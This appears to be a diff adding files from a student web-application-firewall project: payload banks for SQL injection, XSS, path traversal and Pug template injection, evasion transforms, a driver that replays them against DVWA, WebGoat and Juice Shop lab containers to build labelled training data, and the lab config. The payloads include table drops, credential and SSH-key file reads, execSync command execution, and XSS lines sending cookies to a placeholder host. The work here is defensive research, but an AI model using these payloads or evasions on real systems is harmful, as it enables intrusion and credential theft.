@@ -1,0 +1,575 @@
+﻿===== BEGIN C:\Users\DPQUCS250122\Downloads\Graduation_WAF_Project\src\attacks\attack_payloads.py =====
+"""
+Attack payload banks + evasion/variant transforms.
+==================================================
+Two responsibilities:
+
+1. BASE PAYLOAD BANKS per attack class, split by GOAL family
+   (recon / exploit / exfiltration) so an attacker persona's `goal` axis
+   actually selects a different payload family.
+
+2. EVASION TRANSFORMS that turn ONE base payload into an obfuscated VARIANT
+   (encoded / mutated / polyglot). Each variant is linked back to its base
+   payload via a stable payload_id, emitted by the driver as X-Capture-Parent
+   (variant_type -> X-Capture-Variant). The mitmproxy addon stores these in
+   record["variant"] = {variant_type, parent_id}, and merge_jsonl.py keeps
+   variants (their raw_request bytes differ from the parent, so dedup won't
+   collapse them).
+
+WHY variants matter for THIS thesis: encoded/mutated variants directly move
+extract_features.py's encoded_char_ratio / special_char_ratio / payload_length,
+so they are exactly the realistic WAF-bypass samples the classifier must learn
+to generalise to.
+"""
+
+import random
+import urllib.parse
+
+# Each entry: (payload_id_suffix, raw_payload)
+
+SQLI = {
+    "recon": [
+        ("probe_quote", "'"),
+        ("probe_and1", "1' AND '1'='1"),
+        ("probe_or1", "1' OR '1'='1"),
+        ("probe_comment", "1'-- -"),
+    ],
+    "exploit": [
+        ("bool_or", "' OR 1=1-- -"),
+        ("auth_bypass", "admin'-- -"),
+        ("error_extract", "' AND extractvalue(1,concat(0x7e,version()))-- -"),
+        ("time_sleep", "1' AND SLEEP(3)-- -"),
+        ("stacked_drop", "1'; DROP TABLE users-- -"),
+    ],
+    "exfiltration": [
+        ("union_users", "' UNION SELECT user,password FROM users-- -"),
+        ("union_schemas", "-1' UNION SELECT schema_name,2 FROM information_schema.schemata-- -"),
+        ("union_columns", "-1' UNION SELECT table_name,column_name FROM information_schema.columns-- -"),
+        ("union_accounts", "' UNION SELECT username,password FROM accounts-- -"),
+    ],
+}
+
+XSS = {
+    "recon": [
+        ("probe_tag", "<b>x</b>"),
+        ("probe_marker", "<xss7411>"),
+        ("probe_attr", "\"><i>x</i>"),
+    ],
+    "exploit": [
+        ("script_alert", "<script>alert(1)</script>"),
+        ("img_onerror", "\"><img src=x onerror=alert(1)>"),
+        ("svg_onload", "<svg/onload=alert(1)>"),
+        ("body_onload", "<body onload=alert(1)>"),
+        ("js_href", "javascript:alert(1)"),
+    ],
+    "exfiltration": [
+        ("cookie_img", "<script>new Image().src='//evil.example/c?'+document.cookie</script>"),
+        ("cookie_fetch", "<script>fetch('//evil.example/e?d='+btoa(document.cookie))</script>"),
+    ],
+}
+
+PATH_TRAVERSAL = {
+    "recon": [
+        ("shallow_passwd", "../etc/passwd"),
+        ("selfref", "../config"),
+    ],
+    "exploit": [
+        ("passwd_4", "../../../../etc/passwd"),
+        ("passwd_6", "../../../../../../etc/passwd"),
+        ("winini", r"..\..\..\..\windows\win.ini"),
+        ("hosts", "../../../../etc/hosts"),
+    ],
+    "exfiltration": [
+        ("shadow", "../../../../../../etc/shadow"),
+        ("dvwa_config", "../../../../../../var/www/html/config/config.inc.php"),
+        ("ssh_key", "../../../../../../root/.ssh/id_rsa"),
+    ],
+}
+
+# HELD-OUT unknown (open-set). SSTI (Pug/Jade) on Juice Shop = CWE-94.
+CODE_INJECTION = {
+    "recon": [
+        ("ssti_math", "#{7*7}"),
+        ("ssti_add", "#{1+1}"),
+    ],
+    "exploit": [
+        ("ssti_rce_id", "#{root.process.mainModule.require('child_process').execSync('id')}"),
+        ("ssti_rce_ls", "#{root.process.mainModule.require('child_process').execSync('ls -la')}"),
+        ("ssti_hostname", "#{global.process.mainModule.require('os').hostname()}"),
+    ],
+    "exfiltration": [
+        ("ssti_env", "#{root.process.mainModule.require('child_process').execSync('env')}"),
+        ("ssti_readpasswd", "#{root.process.mainModule.require('fs').readFileSync('/etc/passwd')}"),
+    ],
+}
+
+BANKS = {
+    "sqli": SQLI,
+    "xss": XSS,
+    "path_traversal": PATH_TRAVERSAL,
+    "code_injection": CODE_INJECTION,
+}
+
+# Polyglots - payloads crafted to fire across multiple contexts. Kept as a
+# BANK per attack type (not a single string) so the polyglot persona still
+# produces real byte-diversity instead of collapsing to one sample per class
+# after byte-identical dedup in merge_jsonl.py.
+POLYGLOTS = {
+    "sqli": [
+        "1' OR '1'='1' UNION SELECT NULL-- -",
+        "1'/**/OR/**/1=1#",
+        "') OR ('a'='a",
+        "\" OR \"\"=\"",
+        "1); WAITFOR DELAY '0:0:3'-- -",
+    ],
+    "xss": [
+        "\"'><svg/onload=alert(1)>",
+        "javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>",
+        "'\"><img src=x onerror=alert(1)>",
+        "</script><script>alert(1)</script>",
+        "\"><body onload=alert(1)>",
+    ],
+    "path_traversal": [
+        "..%2f..%5c..%2f..%5cetc/passwd",
+        "....//....//....//etc/passwd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "..%c0%af..%c0%af..%c0%afetc/passwd",
+        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    ],
+    "code_injection": [
+        "#{7*7}${7*7}{{7*7}}",
+        "${{7*7}}#{7*7}<%= 7*7 %>",
+        "{{7*7}}[[7*7]]#{7*7}",
+        "#{7*7}${{7*7}}{{7*'7'}}",
+    ],
+}
+
+# Which families are unlocked by each goal (cumulative). recon is always a
+# floor so even LOW-intensity recon personas get usable payloads.
+_GOAL_FAMILIES = {
+    "recon": ["recon"],
+    "exploit": ["recon", "exploit"],
+    "exfiltration": ["recon", "exploit", "exfiltration"],
+}
+
+
+def base_payloads(attack_type: str, goal: str) -> list:
+    """Return [(payload_id, raw_payload)] for an attack type, filtered by goal."""
+    bank = BANKS[attack_type]
+    out = []
+    for fam in _GOAL_FAMILIES[goal]:
+        for suffix, payload in bank.get(fam, []):
+            out.append((f"{attack_type}-{fam}-{suffix}", payload))
+    return out
+
+
+# ----------------------------- evasion transforms -----------------------------
+def _encode_url(p: str) -> str:
+    return urllib.parse.quote(p, safe="")
+
+
+def _encode_double(p: str) -> str:
+    return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")
+
+
+def _mutate_case(p: str) -> str:
+    # Randomised case-swap - defeats naive case-sensitive keyword filters.
+    out = []
+    for c in p:
+        if c.isalpha() and random.random() < 0.5:
+            out.append(c.upper() if c.islower() else c.lower())
+        else:
+            out.append(c)
+    return "".join(out)
+
+
+def _mutate_comment(p: str) -> str:
+    # Inline SQL comments in place of spaces (harmless-looking elsewhere).
+    return p.replace(" ", "/**/")
+
+
+def _mutate_ws(p: str) -> str:
+    # Swap spaces for tabs (whitespace-based filter bypass).
+    return p.replace(" ", "\t")
+
+
+def apply_evasion(payload_id: str, raw_payload: str, evasion: str,
+                  attack_type: str, rng=random):
+    """Return (variant_type, parent_id, transformed_payload).
+
+    variant_type == 'original' means no transform was applied. parent_id links
+    a variant back to its base payload_id (emitted as X-Capture-Parent).
+    """
+    if evasion == "encoded":
+        fn = rng.choice([_encode_url, _encode_double])
+        return "encoded", payload_id, fn(raw_payload)
+    if evasion == "mutated":
+        fn = rng.choice([_mutate_case, _mutate_comment, _mutate_ws])
+        return "mutated", payload_id, fn(raw_payload)
+    if evasion == "polyglot":
+        bank = POLYGLOTS[attack_type]
+        idx = rng.randrange(len(bank))
+        return "polyglot", f"{attack_type}-polyglot-{idx}", bank[idx]
+    return "original", payload_id, raw_payload
+
+
+if __name__ == "__main__":
+    for at in BANKS:
+        n = sum(len(v) for v in BANKS[at].values())
+        print(f"{at:16s} base_payloads={n} polyglots={len(POLYGLOTS[at])}")
+
+
+===== END attack_payloads.py =====
+
+===== BEGIN C:\Users\DPQUCS250122\Downloads\Graduation_WAF_Project\src\attacks\attack_driver.py =====
+"""
+attack_driver.py - persona/scenario-driven ATTACK traffic generator.
+=====================================================================
+The attack analogue of src/collection/benign_driver.py. It replays curated
+payloads through the ATTACK proxy (proxy_attack, port 8889) so the shared
+mitmproxy addon (src/capture/capture_addon.py) captures every request with the
+SAME schema_v2 shape as benign traffic.
+
+The driver sets EVERY X-Capture-* control header explicitly, which is why it -
+unlike dotdotpwn / XSStrike - never relies on the attack proxy's default_label
+(default_label=sqli would otherwise mislabel XSS / path_traversal /
+code_injection; see run_attacks.sh). This makes the Python driver the PRIMARY,
+label-safe generator; run_attacks.sh is an optional real-tool volume booster.
+
+WHAT IT COVERS (every design note):
+  * attacker personas  -> X-Capture-Persona   (attacker_personas.py)
+  * scenarios/endpoint  -> X-Capture-Scenario  (attack_scenarios.py)
+  * evasion variants    -> X-Capture-Variant + X-Capture-Parent (attack_payloads.py)
+  * per-session ids      -> X-Capture-Session   (split-by-session ready)
+  * open-set held-out    -> code_injection collected through the SAME personas,
+                            so "unknown" == novel ATTACK TYPE, not novel style
+  * correct labels        -> X-Capture-Label per attack type
+
+VECTOR CAVEAT (honest limitation, documented in README_ATTACKS.md):
+capture_addon.py derives content.decoded_payload from the URL (path+query)
+ONLY. Payloads delivered via body/header/cookie ARE present in
+content.raw_request, but NOT in the URL-derived aux features
+(payload_length / special_char_ratio / traversal_depth). Extend
+extract_features.py to fold request_body + injected headers into
+decoded_payload if you want those features to cover non-query vectors.
+
+usage:
+  pip install requests pyyaml
+  # bring up the attack proxy first (writes to the SEPARATE data/raw_attack dir):
+  #   docker compose up -d --force-recreate mitmproxy-attack
+  python3 src/attacks/attack_driver.py --config config/sources.yaml
+  python3 src/attacks/attack_driver.py --config config/sources.yaml --only-app dvwa --only-attack sqli
+  python3 src/attacks/attack_driver.py --config config/sources.yaml --dry-run   # preview only
+"""
+
+import argparse
+import random
+import re
+import sys
+import time
+import uuid
+
+import requests
+import yaml
+
+from attacker_personas import ATTACKER_PERSONAS
+from attack_scenarios import build_attack_steps, endpoint_for
+
+
+def rate_delay_s(persona, jitter_pct: float = 25.0) -> float:
+    """Think-time between attack requests (seconds).
+
+    Base range comes from the persona's rate_policy (like benign speed_profile);
+    `jitter_pct` adds benign-style random variance on top so the timing does not
+    look robotic even when the same persona runs many sessions.
+    """
+    lo, hi = persona.rate_policy.min_delay_ms, persona.rate_policy.max_delay_ms
+    base = random.randint(lo, hi)
+    if jitter_pct:
+        base *= 1.0 + random.uniform(-jitter_pct / 100.0, jitter_pct / 100.0)
+    return max(0.0, base) / 1000.0
+
+
+def capture_headers(app, attack_type, session_id, persona, step) -> dict:
+    """All X-Capture-* control headers (read and stripped by the addon)."""
+    return {
+        "X-Capture-Source": app,
+        "X-Capture-App": app,
+        "X-Capture-Type": "scripted",
+        "X-Capture-Mode": "tool",         # generation_mode=tool -> label_source=tool_confirmed
+        "X-Capture-Label": attack_type,   # sqli|xss|path_traversal|code_injection
+        "X-Capture-Session": session_id,
+        "X-Capture-Persona": persona.persona_id,
+        "X-Capture-Scenario": f"{attack_type}:{persona.goal.value}:{step.vector}",
+        "X-Capture-Tool": "attack_driver",
+        "X-Capture-Variant": step.variant_type,
+        "X-Capture-Parent": step.parent_id,
+    }
+
+
+# ------------------------- best-effort per-app auth -------------------------
+def login_dvwa(session, base_url, proxies):
+    """DVWA needs a CSRF user_token + login, then a security=low cookie."""
+    try:
+        r = session.get(f"{base_url}/login.php", timeout=15, verify=False,
+                        proxies=proxies, headers={"X-Capture-Skip": "1"})
+        m = re.search(r"user_token'\s*value='([0-9a-f]+)'", r.text)
+        token = m.group(1) if m else ""
+        session.post(
+            f"{base_url}/login.php",
+            data={"username": "admin", "password": "password",
+                  "Login": "Login", "user_token": token},
+            timeout=15, verify=False,
+            proxies=proxies, headers={"X-Capture-Skip": "1"},
+        )
+        session.cookies.set("security", "low")
+    except Exception as e:
+        print(f"    [dvwa login skipped] {e}", file=sys.stderr)
+
+
+def login_webgoat(session, base_url, proxies):
+    skip = {"X-Capture-Skip": "1"}
+    try:
+        # make sure the account exists (idempotent; harmless if already there)
+        session.post(
+            f"{base_url}/register.mvc",
+            data={"username": "benign-user", "password": "Benign123!",
+                  "matchingPassword": "Benign123!", "agree": "agree"},
+            timeout=15, verify=False, proxies=proxies, headers=skip,
+        )
+        session.post(
+            f"{base_url}/login",
+            data={"username": "benign-user", "password": "Benign123!"},
+            timeout=15, verify=False, proxies=proxies, headers=skip,
+        )
+    except Exception as e:
+        print(f"    [webgoat login skipped] {e}", file=sys.stderr)
+
+
+def do_login(session, app, base_url, proxies):
+    if app == "dvwa":
+        login_dvwa(session, base_url, proxies)
+    elif app == "webgoat":
+        login_webgoat(session, base_url, proxies)
+    # juice_shop search is public; SSTI /profile runs best-effort as guest.
+
+
+# ------------------------- send one attack step -------------------------
+def send_step(session, base_url, step, headers, proxies, dry_run) -> bool:
+    url = base_url + step.path
+    params = dict(step.extra_params)
+    data = None
+    hdrs = dict(headers)
+    cookies = None
+    method = step.method
+
+    if step.vector == "query":
+        params[step.param] = step.payload
+    elif step.vector == "body":
+        data = {step.param: step.payload}
+        if method == "GET":
+            method = "POST"
+    elif step.vector == "header":
+        hdrs["User-Agent"] = step.payload   # header injection point
+        params[step.param] = "test"          # keep the endpoint meaningful
+    elif step.vector == "cookie":
+        cookies = {"inj": step.payload}      # cookie injection point
+        params[step.param] = "test"
+
+    if dry_run:
+        loc = {"query": f"?{step.param}=<payload>", "body": "[body]",
+               "header": "[User-Agent]", "cookie": "[cookie inj]"}[step.vector]
+        print(f"    [{step.attack_type}/{step.variant_type}] {method} "
+              f"{step.path} {loc}  payload={step.payload[:70]!r}")
+        return True
+
+    try:
+        session.request(method, url, params=params, data=data, headers=hdrs,
+                        cookies=cookies, proxies=proxies, timeout=20,
+                        allow_redirects=False, verify=False)
+        return True
+    except Exception as e:
+        print(f"    [skip] {method} {step.path} -> {e}", file=sys.stderr)
+        return False
+
+
+def run_persona_attack(persona, app, base_url, attack_types, proxies,
+                       sessions, dry_run, rng, jitter_pct=25.0,
+                       session_pause_ms=0):
+    for attack_type in attack_types:
+        if not endpoint_for(app, attack_type):
+            continue
+        for s in range(sessions):
+            session_id = str(uuid.uuid4())
+            sess = requests.Session()
+            if not dry_run:
+                do_login(sess, app, base_url, proxies)
+            steps = build_attack_steps(persona, app, attack_type, rng)
+            if not steps:
+                continue
+            rp = persona.rate_policy
+            print(f"  - persona={persona.persona_id} attack={attack_type} "
+                  f"session {s + 1}/{sessions} steps={len(steps)} "
+                  f"delay={rp.min_delay_ms}-{rp.max_delay_ms}ms +/-{jitter_pct:.0f}%")
+            for step in steps:
+                headers = capture_headers(app, attack_type, session_id, persona, step)
+                send_step(sess, base_url, step, headers, proxies, dry_run)
+                if not dry_run:
+                    # think-time between each attack request (benign-style)
+                    time.sleep(rate_delay_s(persona, jitter_pct))
+            sess.close()
+            # pause between sessions (only in real mode, not after the last one)
+            if not dry_run and session_pause_ms and s < sessions - 1:
+                time.sleep(session_pause_ms / 1000.0)
+
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--config", required=True)
+    ap.add_argument("--only-app", default=None, help="dvwa|webgoat|juice_shop")
+    ap.add_argument("--only-attack", default=None,
+                    help="sqli|xss|path_traversal|code_injection")
+    ap.add_argument("--only-persona", default=None)
+    ap.add_argument("--sessions-per-persona", type=int, default=1)
+    ap.add_argument("--seed", type=int, default=None)
+    ap.add_argument("--dry-run", action="store_true",
+                    help="print planned requests, send nothing")
+    ap.add_argument("--jitter-pct", type=float, default=25.0,
+                    help="random variance on think-time delays (benign-style). 0 disables")
+    ap.add_argument("--session-pause-ms", type=int, default=0,
+                    help="extra pause between sessions, in milliseconds")
+    args = ap.parse_args()
+
+    rng = random.Random(args.seed)
+    if args.seed is not None:
+        random.seed(args.seed)
+
+    with open(args.config, encoding="utf-8") as f:
+        cfg = yaml.safe_load(f)
+
+    proxy_url = cfg["proxy_attack"]
+    proxies = {"http": proxy_url, "https": proxy_url}
+
+    apps = cfg["apps"]
+    if args.only_app:
+        apps = {args.only_app: apps[args.only_app]}
+
+    personas = list(ATTACKER_PERSONAS.values())
+    if args.only_persona:
+        personas = [ATTACKER_PERSONAS[args.only_persona]]
+
+    try:
+        import urllib3
+        urllib3.disable_warnings()
+    except Exception:
+        pass
+
+    for app_name, app_cfg in apps.items():
+        base_url = app_cfg["base_url"]
+        train_attacks = list(app_cfg.get("attacks", []))
+        heldout = ["code_injection"] if app_cfg.get("code_injection") else []
+        attack_types = train_attacks + heldout
+        if args.only_attack:
+            attack_types = [a for a in attack_types if a == args.only_attack]
+        if not attack_types:
+            continue
+        print(f"[+] {app_name} -> {base_url}  attacks={attack_types}")
+        for persona in personas:
+            run_persona_attack(persona, app_name, base_url, attack_types,
+                               proxies, args.sessions_per_persona, args.dry_run,
+                               rng, args.jitter_pct, args.session_pause_ms)
+
+    print("[done] dry-run complete (no traffic sent)" if args.dry_run
+          else "[done] attack collection finished -> data/raw_attack/*_raw.jsonl")
+
+
+if __name__ == "__main__":
+    main()
+
+===== END attack_driver.py =====
+
+===== BEGIN C:\Users\DPQUCS250122\Downloads\Graduation_WAF_Project\config\sources.yaml =====
+# ==============================================================================
+# Single source-of-truth for app config + persona + attack matrix (schema v2).
+#  benign_driver.py  run_attacks.sh
+# ==============================================================================
+
+proxy_benign: "http://127.0.0.1:8888"
+proxy_attack: "http://127.0.0.1:8889"
+
+# ---  :    benign + attack (paired within app) ---
+apps:
+  juice_shop:
+    tech_stack: "node_angular"
+    base_url: "http://juice-shop:3000"   #   service  lab_net ( proxied  mitmproxy)
+    requires_login: false
+    #  benign  personas  (register   -  0  RUN_GUIDE).
+    #     env: JUICE_BENIGN_EMAIL / JUICE_BENIGN_PASSWORD
+    #     logged-in personas   guests .
+    benign_login:
+      email: "benign_user@juice-sh.op"
+      password: "Benign123!"
+      register_once: true
+    journeys: ["browse_home", "search_products", "view_product", "about_pages", "api_products"]
+    #     (training) +   held-out code_injection
+    attacks: ["sqli", "xss"]
+    code_injection: "ssti_pug"        # â­ SSTI  Pug template = code injection (CWE-94) â€” held-out
+
+  webgoat:
+    tech_stack: "java"
+    base_url: "http://webgoat:8080/WebGoat"   #   service  lab_net
+    requires_login: true
+    register: true
+    # WebGoat rejects underscores: "Username can only contain lowercase
+    # letters, digits, and -". Must use a hyphen, not benign_user.
+    login_user: "benign-user"
+    login_pass: "Benign123!"
+    journeys: ["login", "browse_lessons", "view_profile", "static_pages"]
+    attacks: ["sqli", "xss", "path_traversal"]
+    code_injection: null              # âŒ WebGoat  Code Injection (CWE-94) â€”  
+
+  dvwa:
+    tech_stack: "php"
+    base_url: "http://dvwa:80"   #  lab_net  80 ( 8081   )
+    requires_login: true
+    setup_db: true
+    login_user: "admin"
+    login_pass: "password"
+    security_level: "low"
+    journeys: ["login", "browse_menu", "view_instructions", "static_pages", "dvwa_sqli_benign", "dvwa_xss_r_benign", "dvwa_fi_benign", "dvwa_brute_benign"]
+    # â­  : DVWA    ( benign ) â€”   source-shortcut
+    attacks: ["sqli", "xss", "path_traversal"]   # path_traversal  File Inclusion (LFI/RFI)
+    code_injection: null              # DVWA  Command Injection (CWE-78)  CWE-94
+
+# ---  :  â†’ ( + endpoint ) ---
+attack_matrix:
+  sqli:
+    tool: "sqlmap"
+    split_role: "train"
+  xss:
+    tool: "xsstrike"
+    split_role: "train"
+  path_traversal:
+    tool: "dotdotpwn"
+    split_role: "train"
+  code_injection:                     # â­ held-out unknown (open-set) â€” 
+    tool: "payloads_replay"           # PayloadsAllTheThings/CWE-94 + SSTI â†’ replay  Juice Shop
+    source_app: "juice_shop"          #    â†’ novelty =   ( source confound)
+    split_role: "heldout_unknown"
+
+# --- benign persona settings for WebGoat & DVWA (benign_driver.py) ---
+# NOTE: persona IDENTITY (name/goal/speed/device/auth/depth/patience) comes
+# from the SAME 6 personas as Juice Shop (src/collection/personas/configs.py),
+# so persona_id values are comparable across all 3 apps. This block only
+# supplies the app-agnostic knobs benign_driver.py still needs: the overall
+# session-length range (adjusted per persona depth) and the UA pool personas
+# are picked from (matched to persona.device: desktop vs mobile).
+personas:
+  session_len: [10, 25]
+  user_agents:
+    - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
+    - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
+    - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36"
+    - "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile Safari/604.1"
+===== END sources.yaml =====
+
